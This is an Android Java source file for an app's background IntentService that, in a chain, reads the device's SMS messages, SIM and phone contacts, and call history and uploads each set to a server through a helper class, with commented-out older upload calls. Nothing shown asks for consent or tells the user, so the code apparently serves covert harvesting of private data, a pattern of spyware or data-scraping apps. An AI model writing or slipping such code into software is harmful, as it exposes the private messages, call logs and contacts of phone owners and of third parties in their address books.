package wza.slx.com.xlxapplication.service;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;

import java.io.IOException;
import java.util.List;

import okhttp3.Call;
import wza.slx.com.xlxapplication.manager.TypeEva;
import wza.slx.com.xlxapplication.model.CallRecord;
import wza.slx.com.xlxapplication.model.Contact;
import wza.slx.com.xlxapplication.model.SmsRecard;
import wza.slx.com.xlxapplication.net.GDS;
import wza.slx.com.xlxapplication.net.NetApi;
import wza.slx.com.xlxapplication.net.http.callback.NoLoadingCallback;
import wza.slx.com.xlxapplication.net.http.parser.StringParser;
import wza.slx.com.xlxapplication.utils.LogUtil;
import wza.slx.com.xlxapplication.utils.Utils;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * helper methods.
 */
public class SlxIntentService extends IntentService {
    // IntentService can perform, e.g. ACTION_FETCH_NEW_ITEMS
    private static final String ACTION_CallRecord = "wza.slx.com.xlxapplication.action.CallRecord";
    private static final String ACTION_Contact = "wza.slx.com.xlxapplication.action.CONTACT";
    private static final String ACTION_Sms = "wza.slx.com.xlxapplication.action.SMS";

    private static final String EXTRA_PARAM1 = "wza.slx.com.xlxapplication.extra.PARAM1";
    private static final String EXTRA_PARAM2 = "wza.slx.com.xlxapplication.extra.PARAM2";

    public SlxIntentService() {
        super("SlxIntentService");
    }


    public static void startActionCallRecord(Context context) {
        Intent intent = new Intent(context, SlxIntentService.class);
        intent.setAction(ACTION_CallRecord);
        context.startService(intent);
    }


    public static void startActionSms(Context context) {
        Intent intent = new Intent(context, SlxIntentService.class);
        intent.setAction(ACTION_Sms);
        context.startService(intent);
    }

    public static void startActionContact(Context context) {
        Intent intent = new Intent(context, SlxIntentService.class);
        intent.setAction(ACTION_Contact);
        context.startService(intent);
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if (ACTION_Sms.equals(action)) {
                handleActionSms();
            } else if (ACTION_Contact.equals(action)) {
                handleActionContact();
            } else if (ACTION_CallRecord.equals(action)) {
                handleActionCallrecord();
            }
        }
    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */
    private void handleActionSms() {
        List<SmsRecard> data = Utils.getSmsInPhone(this);

        GDS gds = new GDS(data, new GDS.GDSCallback() {
            @Override
            public void onSucc(String result) {
                LogUtil.i("service sms", "== " + result);
                startActionContact(SlxIntentService.this);
            }

            @Override
            public void onFail(int code, Exception e) {
                LogUtil.i("service sms", " code " + code + " e " + e.getMessage());
                startActionContact(SlxIntentService.this);
            }
        });
        gds.upload(TypeEva.SMS);

//        NetApi.uploadSms(this, data, new NoLoadingCallback<String>(this,new StringParser()) {
//            @Override
//            public void onSuccess(int code, String s) {
//                LogUtil.i("info upload"," upload succ sms");
//                startActionContact(SlxIntentService.this);
//            }
//
//            @Override
//            public void onFailure(Call call, IOException e) {
//                super.onFailure(call, e);
//                startActionContact(SlxIntentService.this);
//            }
//        });
    }

    private void handleActionContact() {
        List<Contact> data = Utils.getSIMContacts(this);
        data.addAll(Utils.getPhoneContacts(this));
        GDS gds = new GDS(data, new GDS.GDSCallback() {
            @Override
            public void onSucc(String result) {
                LogUtil.i("service sms", "== " + result);
                startActionCallRecord(SlxIntentService.this);
            }

            @Override
            public void onFail(int code, Exception e) {
                LogUtil.i("service sms", " code " + code + " e " + e.getMessage());
                startActionCallRecord(SlxIntentService.this);
            }
        });
        gds.upload(TypeEva.Contacts);
//        NetApi.uploadContact(this, data, new NoLoadingCallback<String>(this,new StringParser()) {
//            @Override
//            public void onSuccess(int code, String s) {
//                LogUtil.i("info upload"," upload succ contact ");
//                startActionCallRecord(SlxIntentService.this);
//            }
//
//            @Override
//            public void onFailure(Call call, IOException e) {
//                super.onFailure(call, e);
//                startActionCallRecord(SlxIntentService.this);
//            }
//        });
    }

    private void handleActionCallrecord() {
        List<CallRecord> data = Utils.getCallHistoryList(this);
        GDS gds = new GDS(data, new GDS.GDSCallback() {
            @Override
            public void onSucc(String result) {
                LogUtil.i("service sms", "== " + result);
            }

            @Override
            public void onFail(int code, Exception e) {
                LogUtil.i("service sms", " code " + code + " e " + e.getMessage());
            }
        });
        gds.upload(TypeEva.CallRecords);
//        NetApi.uploadCallRecord(this, data, new NoLoadingCallback<String>(this,new StringParser()) {
//            @Override
//            public void onSuccess(int code, String s) {
//                LogUtil.i("info upload"," upload succ callrecord");
//            }
//        });
    }


}
